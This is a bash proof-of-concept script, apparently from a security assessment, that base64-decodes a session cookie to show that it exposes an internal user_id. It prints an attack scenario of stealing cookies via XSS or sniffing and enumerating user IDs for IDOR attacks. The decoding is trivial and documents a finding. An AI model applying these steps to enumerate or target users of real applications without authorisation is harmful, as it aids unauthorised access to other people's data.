#!/bin/bash

# POC: Session Cookie User ID Exposure
# This script demonstrates that user_id can be trivially extracted from the session cookie
# through base64 decoding, exposing internal user identification.
# Based on provided evidence: eyJ1c2VyX2lkIjoxMDAzMn0.aQo6Zw.hwRa_YbJEoqSx6Avy_bjqV0TKFI

echo "=== Session Cookie User ID Exposure POC ==="
echo ""

# Provided session cookie (from application)
SESSION_COOKIE="eyJ1c2VyX2lkIjoxMDAzMn0.aQo6Zw.hwRa_YbJEoqSx6Avy_bjqV0TKFI"

echo "[*] Session Cookie: $SESSION_COOKIE"
echo ""

# Step 1: Extract the base64 portion (first part before first dot)
echo "[*] Step 1: Extracting base64-encoded portion..."
BASE64_PART=$(echo "$SESSION_COOKIE" | cut -d'.' -f1)
echo "[+] Base64 portion: $BASE64_PART"
echo ""

# Step 2: Add padding for base64 decoding (base64 requires length multiple of 4)
echo "[*] Step 2: Decoding base64..."
PADDING=$((4 - ${#BASE64_PART} % 4))
if [ $PADDING -ne 4 ]; then
    PADDED_B64="${BASE64_PART}$(printf '=%.0s' $(seq 1 $PADDING))"
else
    PADDED_B64="$BASE64_PART"
fi

echo "[+] Padded base64: $PADDED_B64"

# Step 3: Decode base64
DECODED=$(echo "$PADDED_B64" | base64 -d 2>/dev/null)

if [ $? -ne 0 ]; then
    echo "[-] Failed to decode with standard base64"
    echo "[*] Trying alternative decoding..."
    DECODED=$(echo -n "$PADDED_B64" | base64 -d 2>/dev/null)
    if [ $? -ne 0 ]; then
        echo "[-] Base64 decoding failed"
        exit 1
    fi
fi

echo "[+] Successfully decoded!"
echo "[+] Decoded content: $DECODED"
echo ""

# Step 4: Verify and extract user_id
echo "[*] Step 3: Verifying user_id extraction..."

# Check if the decoded content contains user_id
if echo "$DECODED" | grep -q "user_id"; then
    echo "[+] ✓ Confirmed: user_id is present in decoded session cookie"
    USER_ID=$(echo "$DECODED" | grep -oP '"user_id"\s*:\s*\K[0-9]+')
    echo "[+] ✓ EXPOSED USER_ID: $USER_ID"
else
    echo "[-] user_id not found in expected format"
    exit 1
fi

echo ""
echo "[+] VULNERABILITY CONFIRMED"
echo "==========================================="
echo "[!] The session cookie contains:"
echo "    - Unencrypted user information"
echo "    - Base64-encoded (trivially decodable) content"
echo "    - Exposed user_id: $USER_ID"
echo ""
echo "[!] Attack Scenario:"
echo "    1. Attacker obtains session cookie (via XSS, network sniffing, etc.)"
echo "    2. Attacker decodes base64 to extract user_id: $USER_ID"
echo "    3. Attacker can now:"
echo "       - Use extracted user_id for IDOR attacks"
echo "       - Enumerate other user_ids (10000, 10001, ..., 10032, 10033, etc.)"
echo "       - Target specific users with known IDs for further attacks"
echo "       - Access other users' data if authorization checks are weak"
echo ""
echo "[+] POC Complete: Session cookie vulnerability successfully demonstrated"
exit 0